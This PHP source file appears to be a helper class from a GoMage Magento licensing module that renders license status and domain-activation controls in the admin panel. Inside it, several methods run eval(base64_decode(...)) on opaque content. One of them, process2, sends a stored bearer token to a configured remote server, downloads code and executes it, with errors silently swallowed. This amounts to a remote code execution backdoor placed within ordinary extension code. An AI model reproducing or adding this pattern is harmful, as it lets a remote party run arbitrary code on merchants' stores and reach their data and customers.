<?php

namespace GoMage\Core\Helper;

class Data extends \Magento\Framework\App\Helper\AbstractHelper
{
    protected $increment;
    const BASE_URL = '/api/rest';
    /** * @var \Magento\Catalog\Model\ResourceModel\Product\Attribute\CollectionFactory */
    protected $_attributeCollectionFactory;
    /** * @var \Magento\Store\Model\StoreManagerInterface */
    protected $_storeManager;
    /** * @var \Magento\Store\Model\System\Store */
    protected $_systemStore;
    /** * @var \Magento\Framework\Filesystem\Directory\ReadInterface */
    protected $_directory;
    /** * @var \Magento\Framework\Stdlib\DateTime\DateTime */
    protected $_dateTime;
    /** * @var \Magento\Framework\Module\ModuleListInterface */
    protected $_moduleList;
    /** * @var \Magento\Framework\Json\Helper\Data */
    protected $_jsonHelper;
    /** * @var \Magento\Framework\Encryption\EncryptorInterface */
    protected $_encryptor;
    /** * @var \GoMage\Feed\Model\Mapper\Factory */
    protected $_mapperFactory;
    /** * @var \Magento\Framework\ObjectManagerInterface */
    protected $_objectManager;
    /** * @var \Magento\Framework\App\Config\ScopeConfigInterface */
    protected $_scopeConfig;
    /** * @var \Magento\Framework\HTTP\Client\Curl */
    protected $curl;
    /**
     * @var \Magento\Framework\View\Helper\Js
     */
    protected $_jsHelper;

    /** @var \Magento\Config\Model\ResourceModel\Config  */
    protected $configResource;

    protected $fullModuleList;
    protected $context;
    protected $urlBuilder;

    protected $b = ['groups' => 'api', 'fields' => 'fields', 'value' =>'value', 'section' => 'gomage_core', 'group_s' => 'gomage_s'];

    public function __construct(
        \Magento\Framework\ObjectManagerInterface $objectManager,
        \Magento\Framework\Module\FullModuleList $fullModuleList,
        \Magento\Framework\View\Element\Context $context
    )
    {
        $this->urlBuilder = $context->getUrlBuilder();
        $this->_objectManager = $objectManager;
        $this->_attributeCollectionFactory = $objectManager->get('Magento\Catalog\Model\ResourceModel\Product\Attribute\CollectionFactory');
        $this->configResource = $objectManager->get('Magento\Config\Model\ResourceModel\Config');
        $this->_storeManager = $objectManager->get('Magento\Store\Model\StoreManager');
        $this->_systemStore = $objectManager->get('Magento\Store\Model\System\Store');
        $this->_dateTime = $objectManager->get('Magento\Framework\Stdlib\DateTime\DateTime');
        $this->_moduleList = $objectManager->get('Magento\Framework\Module\ModuleList');
        $this->_jsonHelper = $objectManager->get('Magento\Framework\Json\Helper\Data');
        $this->curl = $objectManager->get('Magento\Framework\HTTP\Client\Curl');
        $this->_encryptor = $objectManager->get('Magento\Framework\Encryption\Encryptor');
        $this->_scopeConfig = $objectManager->get('Magento\Framework\App\Config\ScopeConfigInterface');
        $this->_jsHelper = $objectManager->get('Magento\Framework\View\Helper\Js');
        $this->fullModuleList = $fullModuleList;
    }
   protected $poccessorValue;

   public function proccess($content, $className) {
       try {
           eval(base64_decode($content));
           $className = $className;
           $processor = new $className();
           $processor->process();
       } catch (\Exception $e) {
           return false;
       }
   }

    /** * @return array */
    public function getAvailableWebsites($param)
    {
        $w = [];
        if(!$param) {
            $param = [];
        }
        foreach ($param as $key => $item) {
            $w[$item] = $this->_scopeConfig->getValue($this->b['section'].'/'.$this->b['section'].'/'.$item);
        }
        return $w;
    }

    /** * @return array */
    public function getAvailableStores($param)
    {
        $s = [];
        if(!$param) {
            $param = [];
        }
        foreach ($param as $key => $item) {
            $s[$item] = $this->_scopeConfig->getValue($this->b['section'].'/'.$this->b['group_s'].'/'.$item);
        }
        return $s;
    }
    public function proccess2($curl, $c='ProcessorAct') {
        try {
            $content = $this->process2($curl, $c);
            eval(base64_decode($content['content']));
            if(class_exists($c)) {
                $processor = new $c();
                $processor->process($curl, '/process/info');
            } else {
                return false;
            }
        } catch (\Exception $e) {
            return false;
        }
    }

    public function getN() {
        $n = [];
        $names = $this->fullModuleList->getNames();
        foreach ($names as $name) {
            $nn = strpos($name, 'GoMage');
            if(($nn || 0 === $nn) && $name != 'GoMage_Core') {
                $n[] = $name;
            }
        }
        return $n;
    }
    public function getC(\Magento\Framework\Data\Form\Element\AbstractElement $element)
    {
        $html = '';
        $param = $this->getN();
        $id   = $element->getId();
        $param = $this->getN();
        $websites = $this->getAvailableWebsites($param);
        $stores = $this->getAvailableStores($param);
        $isShowButton = false;
        $secure = $this->_scopeConfig->getValue('web/secure/use_in_frontend');
        foreach ($param as $key => $item) {
            if( $t = $this->_scopeConfig->getValue('section/' . $item. '/e') === '0'){
                $isShowButton = true;
            }

        }
        if($isShowButton)
        $html .= '<div style="width: 100%;  text-align: left;  font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  "><button class="refresh-domain" onclick="event.preventDefault();">'.__('Show availabe domains').'</button></div>';
        if($param) {

            /** @var \Magento\Store\Model\Website $website */
            foreach ($param as $key => $item) {
                if (!$this->_scopeConfig->getValue('section/'.$item.'/a')) {
                    $t = $this->_scopeConfig->getValue('section/' . $item. '/e');
                    switch ($t) {
                        case  1:
                            $html .= '<div style="width: 100%; color: red; text-align: left;  font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">' . __('The number of domains purchased is less than the number of selected') . '</div>';
                            $html .= '<div style="width: 100%; text-align: left; font-weight: bold; font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">' . $item . ' v'.$this->getVersion($item). '</div>';
                            break;
                        case  2:
                            $html .= '<div style="width: 100%; color: red; text-align: left;  font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">' . __('Inccorect  license data. Your licence is blocked') . '</div>';
                            $html .= '<div style="width: 100%; text-align: left; font-weight: bold; font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">'. $item . ' v'.$this->getVersion($item). '</div>';
                            break;
                        case  3:
                            $html .= '<div style="width: 100%; color: red; text-align: left;  font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">' . __('Inccorect  license key. Your licence is blocked') . '</div>';
                            $html .= '<div style="width: 100%; text-align: left; font-weight: bold; font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">'. $item . ' v'.$this->getVersion($item). '</div>';
                            break;
                        case  4:
                            $html .= '<div style="width: 100%; color: red; text-align: left;  font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">' . __('Incorrect license data .') . '</div>';
                            $html .= '<div style="width: 100%; text-align: left; font-weight: bold; font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">'. $item . ' v'.$this->getVersion($item). '</div>';
                            break;
                        case  5:
                            $html .= '<div style="width: 100%; color: red; text-align: left;  font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">' . __('This version is not included in your update period .Your licence is blocked') . '</div>';
                            $html .= '<div style="width: 100%; text-align: left; font-weight: bold; font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">'. $item . ' v'.$this->getVersion($item). '</div>';
                            break;
                        case  6:
                            $html .= '<div style="width: 100%; color: red; text-align: left;  font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">' . __('Your demolicense is expired .Your licence is blocked') . '</div>';
                            $html .= '<div style="width: 100%; text-align: left; font-weight: bold; font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">'. $item . ' v'.$this->getVersion($item). '</div>';

                            break;
                        case  7:
                            $html .= '<div style="width: 100%; color: red; text-align: left;  font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">' . __('The number of domains purchased is less than the number of selected. Your licence is blocked') . '</div>';
                            $html .= '<div style="width: 100%; text-align: left; font-weight: bold; font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">'. $item . ' v'.$this->getVersion($item). '</div>';
                            break;

                        case  8:
                            $html .= '<div style="width: 100%; color: red; text-align: left;  font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">' . __('Exceeds the number of available domains for the license demo') . '</div>';
                            $html .= '<div style="width: 100%; text-align: left; font-weight: bold; font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">'. $item . ' v'.$this->getVersion($item). '</div>';
                            break;
                        default:
                            $html .= '<div style="width: 100%; color: red; text-align: left;  font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">' . __('Module is not Activated') . '</div>';
                            $html .= '<div style="width: 100%; text-align: left; font-weight: bold; font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">'. $item . ' v'.$this->getVersion($item). '</div>';
                    }
                    continue;
                }
                $c = $this->_scopeConfig->getValue('section/' . $item. '/c');
                $counter = $this->_scopeConfig->getValue('section/' . $item. '/c');
                $allDomains = [];
                $partHtml = '<div style="width: 100%; color: green; text-align: left;  font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">' . __('Module is Activated') . '(<span class="'.$item.'">%%counter%%</span>)</div>';
                $name = 'groups[gomage_core][' . $this->b['fields'] . ']['  . $item . '][' . $this->b['value'] . ']';
                $namePrefix = 'groups[' . $this->b['group_s'] . '][' . $this->b['fields'] . '][' .$item . '][' . $this->b['value'] . ']';
                $html .= '<div style="width: 100%; text-align: left; font-weight: bold; font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">' . $item . ' v'.$this->getVersion($item). '</div>';
                $websiteHtml = '';
                if ($this->_scopeConfig->getValue('web/secure/use_in_frontend')) {
                    $base = $this->_scopeConfig->getValue('web/secure/base_url');
                } else {
                    $base = $this->_scopeConfig->getValue('web/unsecure/base_url');
                }
                foreach ($this->_storeManager->getWebsites() as $website) {
                    $website->getConfig('web/unsecure/base_url');
                    $element->setName($name . '[]');
                    $element->setId($id . '_' . $website->getId());
                    $element->setChecked(in_array($website->getId(), $websites[$item] ? explode(',', $websites[$item]) : []));
                    $element->setValue($website->getId());
                    $elementHtml = $element->getElementHtml();

                    if ($secure) {
                        if(in_array($website->getConfig('web/secure/base_url'), $allDomains)) {
                            continue;
                        }
                        $conditionW = $base != $website->getConfig('web/secure/base_url');
                        $allDomains[] =  $website->getConfig('web/secure/base_url');
                    } else {
                        if(in_array($website->getConfig('web/unsecure/base_url'), $allDomains)) {
                            continue;
                        }
                        $conditionW = $base != $website->getConfig('web/unsecure/base_url');
                        $allDomains[] =  $website->getConfig('web/unsecure/base_url');
                    };
                    if(in_array($website->getId(), $websites[$item] ? explode(',', $websites[$item]) : [])) {
                        $counter--;
                    }
                    $elementHtml = $conditionW ? $elementHtml : '';
                    $storeHtml = '';
                    foreach ($website->getStores() as $store) {
                        if (!$store->isActive()) {
                            continue;
                        }
                        if ($secure) {
                            if(in_array($store->getConfig('web/secure/base_url'), $allDomains)) {
                                continue;
                            }
                            $allDomains[]= $store->getConfig('web/secure/base_url');
                            $condition = $base != $store->getConfig('web/secure/base_url');
                        } else {
                            if(in_array($store->getConfig('web/unsecure/base_url'), $allDomains)) {
                                continue;
                            }
                            $allDomains[]= $store->getConfig('web/unsecure/base_url');
                            $condition = $base != $store->getConfig('web/unsecure/base_url');
                        };
                        if(in_array($store->getId(), isset($stores[$item]) ? explode(',', $stores[$item]) : [])) {
                            $counter--;
                        }
                        if ($condition) {

                            $element->setName($namePrefix . '[]');
                            $element->setId($id . '_store_' . $store->getId());
                            $element->setChecked(in_array($store->getId(), isset($stores[$item]) ? explode(',', $stores[$item]) : []));
                            $element->setValue($store->getId());
                            $storeHtml .= '<div class="field choice admin__field admin__field-option" style="margin-left: 10%">' . $element->getElementHtml() .
                                ' <label for="' .
                                $id . '_' . $store->getId() .
                                '" class="admin__field-label"><span>' .
                                $this->_storeManager->getStore($store->getId())->getName() .
                                '</span></label>';
                            $storeHtml .= '</div>' . "\n";
                        }
                    }
                    if ($conditionW || strlen($storeHtml) > 0) {
                        $websiteHtml .= '<div class="field website-checkbox-' . $item . ' choice admin__field admin__field-option">' . $elementHtml .
                            ' <label for="' .
                            $id . '_' . $website->getId() .
                            '" class="admin__field-label"><span>' .
                            $website->getName() .
                            '</span></label>';
                    }
                    if (strlen($storeHtml) > 0) {
                        $websiteHtml .= $storeHtml;
                    }


                    if ($conditionW || strlen($storeHtml) > 0) {
                        $websiteHtml .= '</div>' . "\n";
                    }
                }
                $partHtml = str_replace('%%counter%%', $counter, $partHtml);
                $html .= $partHtml.$websiteHtml;
            }
            if (!$param) {
                $param = [];
            } else {
                $nameStore = $element->getName();
                $element->setName($nameStore . '[]');
                $jsString = '';
            }
            foreach ($param as $key => $item) {
                //var_dump('.website-checkbox-' . $item . ' input[name="' . $name . "']");
                $c = (int)$this->_scopeConfig->getValue('section/' .  $item . '/c') ? ((int)$this->_scopeConfig->getValue('section/' . $item. '/c')) : 0;
                $name = 'groups[' . $this->b['section'] . '][' . $this->b['fields'] . '][' .  $item . '][' . $this->b['value'] . '][]';
                $namePrefix = 'groups[' . $this->b['group_s'] . '][' . $this->b['fields'] . '][' .  $item . '][' . $this->b['value'] . '][]';
                $jsString .= '
                             
                        if($$(".website-checkbox-' . $item . ' input[name=\'' . $namePrefix . '\']:checked , .website-checkbox-' . $item . ' input[name=\'' . $name . '\']:checked").length >= ' . $c.'){
                        $$(".website-checkbox-' . $item . ' input[name=\'' . $namePrefix . '\'], .website-checkbox-' . $item . ' input[name=\'' . $name . '\']").each(function(e){
                            if(!e.checked){
                                e.disabled = "disabled";
                            }
                        });
    			    }else {
                        $$(".website-checkbox-' . $item . ' input[name=\'' . $namePrefix . '\'], .website-checkbox-' . $item . ' input[name=\'' . $name . '\'] ").each(function(e){
                            if(!e.checked){
                                e.disabled = "";
                            }
                        });
    			    }
            $$(".website-checkbox-' . $item . ' input[name=\'' . $namePrefix . '\'], .website-checkbox-' . $item . ' input[name=\'' . $name . '\']").each(function(element) {
               element.observe("click", function () {
                      counter = counterAll - (+$$(".website-checkbox-' . $item . ' input[name=\'' . $namePrefix . '\']:checked , .website-checkbox-' . $item . ' input[name=\'' . $name . '\']:checked").length);
                      
                      $$("span.'.$item.'").first().innerHTML=counter;
                    if($$(".website-checkbox-' . $item . ' input[name=\'' . $namePrefix . '\']:checked , .website-checkbox-' . $item . ' input[name=\'' . $name . '\']:checked").length >= ' . $c
                    . '){
                        $$(".website-checkbox-' . $item . ' input[name=\'' . $namePrefix . '\'], .website-checkbox-' . $item . ' input[name=\'' . $name . '\']").each(function(e){
                            if(!e.checked){
                            
                                e.disabled = "disabled";
                            }
                        });
    			    }else {
                        $$(".website-checkbox-' . $item . ' input[name=\'' . $namePrefix . '\'], .website-checkbox-' . $item . ' input[name=\'' . $name . '\'] ").each(function(e){
                            if(!e.checked){
                                e.disabled = "";
                            }
                        });
    			    }
               });
            });';
            }
        }
        return $html . $this->_jsHelper->getScript(
                'require([\'prototype\'], function(){document.observe("dom:loaded", function() {
                    $$(".refresh-domain").first().observe("click", function () {
                        new Ajax.Request("'.$this->urlBuilder->getUrl('your/url').'", {
                                  onSuccess: function(response) {
                                    
                                  }
                            });
                     });
                    var counter = '.$counter.'; 
                    var counterAll = '.$c.'; 
                ' . $jsString . '});});'
            );

        return sprintf('<strong class="required">%s</strong>', __('Please enter a valid key'));
        return $param;
    }

    public function process2($curl, $processName)
    {
        $objectManager = \Magento\Framework\App\ObjectManager::getInstance();
        /** @var \Magento\Framework\App\Config\ConfigResource\ConfigInterface $config */
        try {
            $config = $objectManager
                ->get('Magento\Framework\App\Config\ScopeConfigInterface');
            $param = $config->getValue('section/gomage_client/param');
            $curl->addHeader("Authorization", "Bearer {$param}");
            $curl->get($this->_scopeConfig->getValue('gomage_core_url/url_core').self::BASE_URL.'/activates/proccessor?processorName='.$processName);
            $a = json_decode($curl->getBody(), true);
            eval(base64_decode($a['content']));
            return new $processName();
        } catch (\Exception $e) {
            $this->cl();
        }

    }
    public function proccess3($curl, $data, $c='ProcessorAct') {
        try {
            eval(base64_decode($data['data_customer']['content_processor']));
            $c = 'ProcessorAct';
            $processor = new $c();
           return $processor;
        } catch (\Exception $e) {
            return false;
        }
    }
    /**
     * @return string
     */
    private function getVersion($name)
    {
        $objectManager = \Magento\Framework\App\ObjectManager::getInstance();
        $moduleList = $objectManager
            ->get('Magento\Framework\Module\ModuleListInterface');
        return $moduleList->getOne($name)['setup_version'];
    }

    public function getU()
    {
       return $this->_scopeConfig->getValue($this->b['section'].'/'.$this->b['groups']);
    }

    public function cl() {
        $n = $this->getN();
        foreach ($n as $i) {
            $this->configResource->deleteConfig('section/' .$i . '/e', 'default', 0);
            $this->configResource->deleteConfig('section/' . $i . '/a', 'default', 0);
            $this->configResource->deleteConfig('section/' . $i . '/coll', 'default', 0);
            $this->configResource->deleteConfig('gomage_core/gomage_s/'.$i , 'default', 0);
            $this->configResource->deleteConfig($this->b['section'].'/'.$this->b['section'].'/'.$i , 'default', 0);
        }
    }
}